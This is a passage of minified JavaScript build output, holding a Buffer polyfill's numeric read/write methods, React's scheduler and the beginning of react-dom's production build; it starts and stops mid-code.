G=w*2**24+this[++g]*2**16+this[++g]*2**8+this[++g],Z=this[++g]*2**24+this[++g]*2**16+this[++g]*2**8+F;return(BigInt(G)<<BigInt(32))+BigInt(Z)}),a.prototype.readIntLE=function(g,w,F){g=g>>>0,w=w>>>0,F||D(g,w,this.length);let G=this[g],Z=1,ee=0;for(;++ee<w&&(Z*=256);)G+=this[g+ee]*Z;return Z*=128,G>=Z&&(G-=Math.pow(2,8*w)),G},a.prototype.readIntBE=function(g,w,F){g=g>>>0,w=w>>>0,F||D(g,w,this.length);let G=w,Z=1,ee=this[g+--G];for(;G>0&&(Z*=256);)ee+=this[g+--G]*Z;return Z*=128,ee>=Z&&(ee-=Math.pow(2,8*w)),ee},a.prototype.readInt8=function(g,w){return g=g>>>0,w||D(g,1,this.length),this[g]&128?(255-this[g]+1)*-1:this[g]},a.prototype.readInt16LE=function(g,w){g=g>>>0,w||D(g,2,this.length);const F=this[g]|this[g+1]<<8;return F&32768?F|4294901760:F},a.prototype.readInt16BE=function(g,w){g=g>>>0,w||D(g,2,this.length);const F=this[g+1]|this[g]<<8;return F&32768?F|4294901760:F},a.prototype.readInt32LE=function(g,w){return g=g>>>0,w||D(g,4,this.length),this[g]|this[g+1]<<8|this[g+2]<<16|this[g+3]<<24},a.prototype.readInt32BE=function(g,w){return g=g>>>0,w||D(g,4,this.length),this[g]<<24|this[g+1]<<16|this[g+2]<<8|this[g+3]},a.prototype.readBigInt64LE=wn(function(g){g=g>>>0,Pt(g,"offset");const w=this[g],F=this[g+7];(w===void 0||F===void 0)&&We(g,this.length-8);const G=this[g+4]+this[g+5]*2**8+this[g+6]*2**16+(F<<24);return(BigInt(G)<<BigInt(32))+BigInt(w+this[++g]*2**8+this[++g]*2**16+this[++g]*2**24)}),a.prototype.readBigInt64BE=wn(function(g){g=g>>>0,Pt(g,"offset");const w=this[g],F=this[g+7];(w===void 0||F===void 0)&&We(g,this.length-8);const G=(w<<24)+this[++g]*2**16+this[++g]*2**8+this[++g];return(BigInt(G)<<BigInt(32))+BigInt(this[++g]*2**24+this[++g]*2**16+this[++g]*2**8+F)}),a.prototype.readFloatLE=function(g,w){return g=g>>>0,w||D(g,4,this.length),t.read(this,g,!0,23,4)},a.prototype.readFloatBE=function(g,w){return g=g>>>0,w||D(g,4,this.length),t.read(this,g,!1,23,4)},a.prototype.readDoubleLE=function(g,w){return g=g>>>0,w||D(g,8,this.length),t.read(this,g,!0,52,8)},a.prototype.readDoubleBE=function(g,w){return g=g>>>0,w||D(g,8,this.length),t.read(this,g,!1,52,8)};function y(P,g,w,F,G,Z){if(!a.isBuffer(P))throw new TypeError('"buffer" argument must be a Buffer instance');if(g>G||g<Z)throw new RangeError('"value" argument is out of bounds');if(w+F>P.length)throw new RangeError("Index out of range")}a.prototype.writeUintLE=a.prototype.writeUIntLE=function(g,w,F,G){if(g=+g,w=w>>>0,F=F>>>0,!G){const Oe=Math.pow(2,8*F)-1;y(this,g,w,F,Oe,0)}let Z=1,ee=0;for(this[w]=g&255;++ee<F&&(Z*=256);)this[w+ee]=g/Z&255;return w+F},a.prototype.writeUintBE=a.prototype.writeUIntBE=function(g,w,F,G){if(g=+g,w=w>>>0,F=F>>>0,!G){const Oe=Math.pow(2,8*F)-1;y(this,g,w,F,Oe,0)}let Z=F-1,ee=1;for(this[w+Z]=g&255;--Z>=0&&(ee*=256);)this[w+Z]=g/ee&255;return w+F},a.prototype.writeUint8=a.prototype.writeUInt8=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,1,255,0),this[w]=g&255,w+1},a.prototype.writeUint16LE=a.prototype.writeUInt16LE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,2,65535,0),this[w]=g&255,this[w+1]=g>>>8,w+2},a.prototype.writeUint16BE=a.prototype.writeUInt16BE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,2,65535,0),this[w]=g>>>8,this[w+1]=g&255,w+2},a.prototype.writeUint32LE=a.prototype.writeUInt32LE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,4,4294967295,0),this[w+3]=g>>>24,this[w+2]=g>>>16,this[w+1]=g>>>8,this[w]=g&255,w+4},a.prototype.writeUint32BE=a.prototype.writeUInt32BE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,4,4294967295,0),this[w]=g>>>24,this[w+1]=g>>>16,this[w+2]=g>>>8,this[w+3]=g&255,w+4};function V(P,g,w,F,G){Ue(g,F,G,P,w,7);let Z=Number(g&BigInt(4294967295));P[w++]=Z,Z=Z>>8,P[w++]=Z,Z=Z>>8,P[w++]=Z,Z=Z>>8,P[w++]=Z;let ee=Number(g>>BigInt(32)&BigInt(4294967295));return P[w++]=ee,ee=ee>>8,P[w++]=ee,ee=ee>>8,P[w++]=ee,ee=ee>>8,P[w++]=ee,w}function oe(P,g,w,F,G){Ue(g,F,G,P,w,7);let Z=Number(g&BigInt(4294967295));P[w+7]=Z,Z=Z>>8,P[w+6]=Z,Z=Z>>8,P[w+5]=Z,Z=Z>>8,P[w+4]=Z;let ee=Number(g>>BigInt(32)&BigInt(4294967295));return P[w+3]=ee,ee=ee>>8,P[w+2]=ee,ee=ee>>8,P[w+1]=ee,ee=ee>>8,P[w]=ee,w+8}a.prototype.writeBigUInt64LE=wn(function(g,w=0){return V(this,g,w,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeBigUInt64BE=wn(function(g,w=0){return oe(this,g,w,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeIntLE=function(g,w,F,G){if(g=+g,w=w>>>0,!G){const Pe=Math.pow(2,8*F-1);y(this,g,w,F,Pe-1,-Pe)}let Z=0,ee=1,Oe=0;for(this[w]=g&255;++Z<F&&(ee*=256);)g<0&&Oe===0&&this[w+Z-1]!==0&&(Oe=1),this[w+Z]=(g/ee>>0)-Oe&255;return w+F},a.prototype.writeIntBE=function(g,w,F,G){if(g=+g,w=w>>>0,!G){const Pe=Math.pow(2,8*F-1);y(this,g,w,F,Pe-1,-Pe)}let Z=F-1,ee=1,Oe=0;for(this[w+Z]=g&255;--Z>=0&&(ee*=256);)g<0&&Oe===0&&this[w+Z+1]!==0&&(Oe=1),this[w+Z]=(g/ee>>0)-Oe&255;return w+F},a.prototype.writeInt8=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,1,127,-128),g<0&&(g=255+g+1),this[w]=g&255,w+1},a.prototype.writeInt16LE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,2,32767,-32768),this[w]=g&255,this[w+1]=g>>>8,w+2},a.prototype.writeInt16BE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,2,32767,-32768),this[w]=g>>>8,this[w+1]=g&255,w+2},a.prototype.writeInt32LE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,4,2147483647,-2147483648),this[w]=g&255,this[w+1]=g>>>8,this[w+2]=g>>>16,this[w+3]=g>>>24,w+4},a.prototype.writeInt32BE=function(g,w,F){return g=+g,w=w>>>0,F||y(this,g,w,4,2147483647,-2147483648),g<0&&(g=4294967295+g+1),this[w]=g>>>24,this[w+1]=g>>>16,this[w+2]=g>>>8,this[w+3]=g&255,w+4},a.prototype.writeBigInt64LE=wn(function(g,w=0){return V(this,g,w,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),a.prototype.writeBigInt64BE=wn(function(g,w=0){return oe(this,g,w,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))});function le(P,g,w,F,G,Z){if(w+F>P.length)throw new RangeError("Index out of range");if(w<0)throw new RangeError("Index out of range")}function he(P,g,w,F,G){return g=+g,w=w>>>0,G||le(P,g,w,4),t.write(P,g,w,F,23,4),w+4}a.prototype.writeFloatLE=function(g,w,F){return he(this,g,w,!0,F)},a.prototype.writeFloatBE=function(g,w,F){return he(this,g,w,!1,F)};function ke(P,g,w,F,G){return g=+g,w=w>>>0,G||le(P,g,w,8),t.write(P,g,w,F,52,8),w+8}a.prototype.writeDoubleLE=function(g,w,F){return ke(this,g,w,!0,F)},a.prototype.writeDoubleBE=function(g,w,F){return ke(this,g,w,!1,F)},a.prototype.copy=function(g,w,F,G){if(!a.isBuffer(g))throw new TypeError("argument should be a Buffer");if(F||(F=0),!G&&G!==0&&(G=this.length),w>=g.length&&(w=g.length),w||(w=0),G>0&&G<F&&(G=F),G===F||g.length===0||this.length===0)return 0;if(w<0)throw new RangeError("targetStart out of bounds");if(F<0||F>=this.length)throw new RangeError("Index out of range");if(G<0)throw new RangeError("sourceEnd out of bounds");G>this.length&&(G=this.length),g.length-w<G-F&&(G=g.length-w+F);const Z=G-F;return this===g&&typeof Uint8Array.prototype.copyWithin=="function"?this.copyWithin(w,F,G):Uint8Array.prototype.set.call(g,this.subarray(F,G),w),Z},a.prototype.fill=function(g,w,F,G){if(typeof g=="string"){if(typeof w=="string"?(G=w,w=0,F=this.length):typeof F=="string"&&(G=F,F=this.length),G!==void 0&&typeof G!="string")throw new TypeError("encoding must be a string");if(typeof G=="string"&&!a.isEncoding(G))throw new TypeError("Unknown encoding: "+G);if(g.length===1){const ee=g.charCodeAt(0);(G==="utf8"&&ee<128||G==="latin1")&&(g=ee)}}else typeof g=="number"?g=g&255:typeof g=="boolean"&&(g=Number(g));if(w<0||this.length<w||this.length<F)throw new RangeError("Out of range index");if(F<=w)return this;w=w>>>0,F=F===void 0?this.length:F>>>0,g||(g=0);let Z;if(typeof g=="number")for(Z=w;Z<F;++Z)this[Z]=g;else{const ee=a.isBuffer(g)?g:a.from(g,G),Oe=ee.length;if(Oe===0)throw new TypeError('The value "'+g+'" is invalid for argument "value"');for(Z=0;Z<F-w;++Z)this[Z+w]=ee[Z%Oe]}return this};const Te={};function Ne(P,g,w){Te[P]=class extends w{constructor(){super(),Object.defineProperty(this,"message",{value:g.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${P}]`,this.stack,delete this.name}get code(){return P}set code(G){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:G,writable:!0})}toString(){return`${this.name} [${P}]: ${this.message}`}}}Ne("ERR_BUFFER_OUT_OF_BOUNDS",function(P){return P?`${P} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"},RangeError),Ne("ERR_INVALID_ARG_TYPE",function(P,g){return`The "${P}" argument must be of type number. Received type ${typeof g}`},TypeError),Ne("ERR_OUT_OF_RANGE",function(P,g,w){let F=`The value of "${P}" is out of range.`,G=w;return Number.isInteger(w)&&Math.abs(w)>2**32?G=gt(String(w)):typeof w=="bigint"&&(G=String(w),(w>BigInt(2)**BigInt(32)||w<-(BigInt(2)**BigInt(32)))&&(G=gt(G)),G+="n"),F+=` It must be ${g}. Received ${G}`,F},RangeError);function gt(P){let g="",w=P.length;const F=P[0]==="-"?1:0;for(;w>=F+4;w-=3)g=`_${P.slice(w-3,w)}${g}`;return`${P.slice(0,w)}${g}`}function je(P,g,w){Pt(g,"offset"),(P[g]===void 0||P[g+w]===void 0)&&We(g,P.length-(w+1))}function Ue(P,g,w,F,G,Z){if(P>w||P<g){const ee=typeof g=="bigint"?"n":"";let Oe;throw Z>3?g===0||g===BigInt(0)?Oe=`>= 0${ee} and < 2${ee} ** ${(Z+1)*8}${ee}`:Oe=`>= -(2${ee} ** ${(Z+1)*8-1}${ee}) and < 2 ** ${(Z+1)*8-1}${ee}`:Oe=`>= ${g}${ee} and <= ${w}${ee}`,new Te.ERR_OUT_OF_RANGE("value",Oe,P)}je(F,G,Z)}function Pt(P,g){if(typeof P!="number")throw new Te.ERR_INVALID_ARG_TYPE(g,"number",P)}function We(P,g,w){throw Math.floor(P)!==P?(Pt(P,w),new Te.ERR_OUT_OF_RANGE(w||"offset","an integer",P)):g<0?new Te.ERR_BUFFER_OUT_OF_BOUNDS:new Te.ERR_OUT_OF_RANGE(w||"offset",`>= ${w?1:0} and <= ${g}`,P)}const Ke=/[^+/0-9A-Za-z-_]/g;function Di(P){if(P=P.split("=")[0],P=P.trim().replace(Ke,""),P.length<2)return"";for(;P.length%4!==0;)P=P+"=";return P}function ot(P,g){g=g||1/0;let w;const F=P.length;let G=null;const Z=[];for(let ee=0;ee<F;++ee){if(w=P.charCodeAt(ee),w>55295&&w<57344){if(!G){if(w>56319){(g-=3)>-1&&Z.push(239,191,189);continue}else if(ee+1===F){(g-=3)>-1&&Z.push(239,191,189);continue}G=w;continue}if(w<56320){(g-=3)>-1&&Z.push(239,191,189),G=w;continue}w=(G-55296<<10|w-56320)+65536}else G&&(g-=3)>-1&&Z.push(239,191,189);if(G=null,w<128){if((g-=1)<0)break;Z.push(w)}else if(w<2048){if((g-=2)<0)break;Z.push(w>>6|192,w&63|128)}else if(w<65536){if((g-=3)<0)break;Z.push(w>>12|224,w>>6&63|128,w&63|128)}else if(w<1114112){if((g-=4)<0)break;Z.push(w>>18|240,w>>12&63|128,w>>6&63|128,w&63|128)}else throw new Error("Invalid code point")}return Z}function vt(P){const g=[];for(let w=0;w<P.length;++w)g.push(P.charCodeAt(w)&255);return g}function Oi(P,g){let w,F,G;const Z=[];for(let ee=0;ee<P.length&&!((g-=2)<0);++ee)w=P.charCodeAt(ee),F=w>>8,G=w%256,Z.push(G),Z.push(F);return Z}function at(P){return e.toByteArray(Di(P))}function Xe(P,g,w,F){let G;for(G=0;G<F&&!(G+w>=g.length||G>=P.length);++G)g[G+w]=P[G];return G}function on(P,g){return P instanceof g||P!=null&&P.constructor!=null&&P.constructor.name!=null&&P.constructor.name===g.name}function lt(P){return P!==P}const ct=function(){const P="0123456789abcdef",g=new Array(256);for(let w=0;w<16;++w){const F=w*16;for(let G=0;G<16;++G)g[F+G]=P[w]+P[G]}return g}();function wn(P){return typeof BigInt>"u"?ut:P}function ut(){throw new Error("BigInt not supported")}})(Le);var Rm={},NS={exports:{}},Nr={},PS={exports:{}},LS={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(n){function e(R,j){var $=R.length;R.push(j);e:for(;0<$;){var D=$-1>>>1,y=R[D];if(0<i(y,j))R[D]=j,R[$]=y,$=D;else break e}}function t(R){return R.length===0?null:R[0]}function r(R){if(R.length===0)return null;var j=R[0],$=R.pop();if($!==j){R[0]=$;e:for(var D=0,y=R.length,V=y>>>1;D<V;){var oe=2*(D+1)-1,le=R[oe],he=oe+1,ke=R[he];if(0>i(le,$))he<y&&0>i(ke,le)?(R[D]=ke,R[he]=$,D=he):(R[D]=le,R[oe]=$,D=oe);else if(he<y&&0>i(ke,$))R[D]=ke,R[he]=$,D=he;else break e}}return j}function i(R,j){var $=R.sortIndex-j.sortIndex;return $!==0?$:R.id-j.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;n.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();n.unstable_now=function(){return o.now()-a}}var l=[],u=[],h=1,f=null,m=3,v=!1,x=!1,k=!1,I=typeof setTimeout=="function"?setTimeout:null,S=typeof clearTimeout=="function"?clearTimeout:null,b=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function E(R){for(var j=t(u);j!==null;){if(j.callback===null)r(u);else if(j.startTime<=R)r(u),j.sortIndex=j.expirationTime,e(l,j);else break;j=t(u)}}function U(R){if(k=!1,E(R),!x)if(t(l)!==null)x=!0,C(H);else{var j=t(u);j!==null&&M(U,j.startTime-R)}}function H(R,j){x=!1,k&&(k=!1,S(N),N=-1),v=!0;var $=m;try{for(E(j),f=t(l);f!==null&&(!(f.expirationTime>j)||R&&!W());){var D=f.callback;if(typeof D=="function"){f.callback=null,m=f.priorityLevel;var y=D(f.expirationTime<=j);j=n.unstable_now(),typeof y=="function"?f.callback=y:f===t(l)&&r(l),E(j)}else r(l);f=t(l)}if(f!==null)var V=!0;else{var oe=t(u);oe!==null&&M(U,oe.startTime-j),V=!1}return V}finally{f=null,m=$,v=!1}}var q=!1,L=null,N=-1,B=5,z=-1;function W(){return!(n.unstable_now()-z<B)}function K(){if(L!==null){var R=n.unstable_now();z=R;var j=!0;try{j=L(!0,R)}finally{j?T():(q=!1,L=null)}}else q=!1}var T;if(typeof b=="function")T=function(){b(K)};else if(typeof MessageChannel<"u"){var d=new MessageChannel,_=d.port2;d.port1.onmessage=K,T=function(){_.postMessage(null)}}else T=function(){I(K,0)};function C(R){L=R,q||(q=!0,T())}function M(R,j){N=I(function(){R(n.unstable_now())},j)}n.unstable_IdlePriority=5,n.unstable_ImmediatePriority=1,n.unstable_LowPriority=4,n.unstable_NormalPriority=3,n.unstable_Profiling=null,n.unstable_UserBlockingPriority=2,n.unstable_cancelCallback=function(R){R.callback=null},n.unstable_continueExecution=function(){x||v||(x=!0,C(H))},n.unstable_forceFrameRate=function(R){0>R||125<R?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):B=0<R?Math.floor(1e3/R):5},n.unstable_getCurrentPriorityLevel=function(){return m},n.unstable_getFirstCallbackNode=function(){return t(l)},n.unstable_next=function(R){switch(m){case 1:case 2:case 3:var j=3;break;default:j=m}var $=m;m=j;try{return R()}finally{m=$}},n.unstable_pauseExecution=function(){},n.unstable_requestPaint=function(){},n.unstable_runWithPriority=function(R,j){switch(R){case 1:case 2:case 3:case 4:case 5:break;default:R=3}var $=m;m=R;try{return j()}finally{m=$}},n.unstable_scheduleCallback=function(R,j,$){var D=n.unstable_now();switch(typeof $=="object"&&$!==null?($=$.delay,$=typeof $=="number"&&0<$?D+$:D):$=D,R){case 1:var y=-1;break;case 2:y=250;break;case 5:y=1073741823;break;case 4:y=1e4;break;default:y=5e3}return y=$+y,R={id:h++,callback:j,priorityLevel:R,startTime:$,expirationTime:y,sortIndex:-1},$>D?(R.sortIndex=$,e(u,R),t(l)===null&&R===t(u)&&(k?(S(N),N=-1):k=!0,M(U,$-D))):(R.sortIndex=y,e(l,R),x||v||(x=!0,C(H))),R},n.unstable_shouldYield=W,n.unstable_wrapCallback=function(R){var j=m;return function(){var $=m;m=j;try{return R.apply(this,arguments)}finally{m=$}}}})(LS);PS.exports=LS;var _R=PS.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ER=Y,Mr=_R;function ae(n){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+n,t=1;t<arguments.length;t++)e+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+n+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var DS=new Set,uu={};function ua(n,e){vl(n,e),vl(n+"Capture",e)}function vl(n,e){for(uu[n]=e,n=0;n<e.length;n++)DS.add(e[n])}var rs=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Mm=Object.prototype.hasOwnProperty,IR=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,O_={},B_={};function SR(n){return Mm.call(B_,n)?!0:Mm.call(O_,n)?!1:IR.test(n)?B_[n]=!0:(O_[n]=!0,!1)}function TR(n,e,t,r){if(t!==null&&t.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return r?!1:t!==null?!t.acceptsBooleans:(n=n.toLowerCase().slice(0,5),n!=="data-"&&n!=="aria-");default:return!1}}function AR(n,e,t,r){if(e===null||typeof e>"u"||TR(n,e,t,r))return!0;if(r)return!1;if(t!==null)switch(t.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function cr(n,e,t,r,i,s,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=t,this.propertyName=n,this.type=e,this.sanitizeURL=s,this.removeEmptyString=o}var jn={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(n){jn[n]=new cr(n,0,!1,n,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(n){var e=n[0];jn[e]=new cr(e,1,!1,n[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(n){jn[n]=new cr(n,2,!1,n.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(n){jn[n]=new cr(n,2,!1,n,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(n){jn[n]=new cr(n,3,!1,n.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(n){jn[n]=new cr(n,3,!0,n,null,!1,!1)});["capture","download"].forEach(function(n){jn[n]=new cr(n,4,!1,n,null,!1,!1)});["cols","rows","size","span"].forEach(function(n){jn[n]=new cr(n,6,!1,n,null,!1,!1)});["rowSpan","start"].forEach(function(n){jn[n]=new cr(n,5,!1,n.toLowerCase(),null,!1,!1)});var Oy=/[\-:]([a-z])/g;function By(n){return n[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(n){var e=n.replace(Oy,By);jn[e]=new cr(e,1,!1,n,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(n){var e=n.replace(Oy,By);jn[e]=new cr(e,1,!1,n,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(n){var e=n.replace(Oy,By);jn[e]=new cr(e,1,!1,n,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(n){jn[n]=new cr(n,1,!1,n.toLowerCase(),null,!1,!1)});jn.xlinkHref=new cr("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(n){jn[n]=new cr(n,1,!1,n.toLowerCase(),null,!0,!0)});function Uy(n,e,t,r){var i=jn.hasOwnProperty(e)?jn[e]:null;(i!==null?i.type!==0:r||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(AR(e,t,i,r)&&(t=null),r||i===null?SR(e)&&(t===null?n.removeAttribute(e):n.setAttribute(e,""+t)):i.mustUseProperty?n[i.propertyName]=t===null?i.type===3?!1:"":t:(e=i.attributeName,r=i.attributeNamespace,t===null?n.removeAttribute(e):(i=i.type,t=i===3||i===4&&t===!0?"":""+t,r?n.setAttributeNS(r,e,t):n.setAttribute(e,t))))}var ps=ER.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ph=Symbol.for("react.element"),Wa=Symbol.for("react.portal"),$a=Symbol.for("react.fragment"),jy=Symbol.for("react.strict_mode"),Nm=Symbol.for("react.profiler"),OS=Symbol.for("react.provider"),BS=Symbol.for("react.context"),Vy=Symbol.for("react.forward_ref"),Pm=Symbol.for("react.suspense"),Lm=Symbol.for("react.suspense_list"),Fy=Symbol.for("react.memo"),xs=Symbol.for("react.lazy"),US=Symbol.for("react.offscreen"),U_=Symbol.iterator;function Ic(n){return n===null||typeof n!="object"?null:(n=U_&&n[U_]||n["@@iterator"],typeof n=="function"?n:null)}var Kt=Object.assign,fg;function Lc(n){if(fg===void 0)try{throw Error()}catch(t){var e=t.stack.trim().match(/\n( *(at )?)/);fg=e&&e[1]||""}return`
`+fg+n}var dg=!1;function pg(n,e){if(!n||dg)return"";dg=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(u){var r=u}Reflect.construct(n,[],e)}else{try{e.call()}catch(u){r=u}n.call(e.prototype)}else{try{throw Error()}catch(u){r=u}n()}}catch(u){if(u&&r&&typeof u.stack=="string"){for(var i=u.stack.split(`
`),s=r.stack.split(`
`),o=i.length-1,a=s.length-1;1<=o&&0<=a&&i[o]!==s[a];)a--;for(;1<=o&&0<=a;o--,a--)if(i[o]!==s[a]){if(o!==1||a!==1)do if(o--,a--,0>a||i[o]!==s[a]){var l=`
`+i[o].replace(" at new "," at ");return n.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",n.displayName)),l}while(1<=o&&0<=a);break}}}finally{dg=!1,Error.prepareStackTrace=t}return(n=n?n.displayName||n.name:"")?Lc(n):""}function bR(n){switch(n.tag){case 5:return Lc(n.type);case 16:return Lc("Lazy");case 13:return Lc("Suspense");case 19:return Lc("SuspenseList");case 0:case 2:case 15:return n=pg(n.type,!1),n;case 11:return n=pg(n.type.render,!1),n;case 1:return n=pg(n.type,!0),n;default:return""}}function Dm(n){if(n==null)return null;if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n;switch(n){case $a:return"Fragment";case Wa:return"Portal";case Nm:return"Profiler";case jy:return"StrictMode";case Pm:return"Suspense";case Lm:return"SuspenseList"}if(typeof n=="object")switch(n.$$typeof){case BS:return(n.displayName||"Context")+".Consumer";case OS:return(n._context.displayName||"Context")+".Provider";case Vy:var e=n.render;return n=n.displayName,n||(n=e.displayName||e.name||"",n=n!==""?"ForwardRef("+n+")":"ForwardRef"),n;case Fy:return e=n.displayName||null,e!==null?e:Dm(n.type)||"Memo";case xs:e=n._payload,n=n._init;try{return Dm(n(e))}catch{}}return null}function xR(n){var e=n.type;switch(n.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return n=e.render,n=n.displayName||n.name||"",e.displayName||(n!==""?"ForwardRef("+n+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Dm(e);case 8:return e===jy?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function oo(n){switch(typeof n){case"boolean":case"number":case"string":case"undefined":return n;case"object":return n;default:return""}}function jS(n){var e=n.type;return(n=n.nodeName)&&n.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function kR(n){var e=jS(n)?"checked":"value",t=Object.getOwnPropertyDescriptor(n.constructor.prototype,e),r=""+n[e];if(!n.hasOwnProperty(e)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var i=t.get,s=t.set;return Object.defineProperty(n,e,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,s.call(this,o)}}),Object.defineProperty(n,e,{enumerable:t.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){n._valueTracker=null,delete n[e]}}}}function Lh(n){n._valueTracker||(n._valueTracker=kR(n))}function VS(n){if(!n)return!1;var e=n._valueTracker;if(!e)return!0;var t=e.getValue(),r="";return n&&(r=jS(n)?n.checked?"true":"false":n.value),n=r,n!==t?(e.setValue(n),!0):!1}function Vf(n){if(n=n||(typeof document<"u"?document:void 0),typeof n>"u")return null;try{return n.activeElement||n.body}catch{return n.body}}function Om(n,e){var t=e.checked;return Kt({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??n._wrapperState.initialChecked})}function j_(n,e){var t=e.defaultValue==null?"":e.defaultValue,r=e.checked!=null?e.checked:e.defaultChecked;t=oo(e.value!=null?e.value:t),n._wrapperState={initialChecked:r,initialValue:t,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function FS(n,e){e=e.checked,e!=null&&Uy(n,"checked",e,!1)}function Bm(n,e){FS(n,e);var t=oo(e.value),r=e.type;if(t!=null)r==="number"?(t===0&&n.value===""||n.value!=t)&&(n.value=""+t):n.value!==""+t&&(n.value=""+t);else 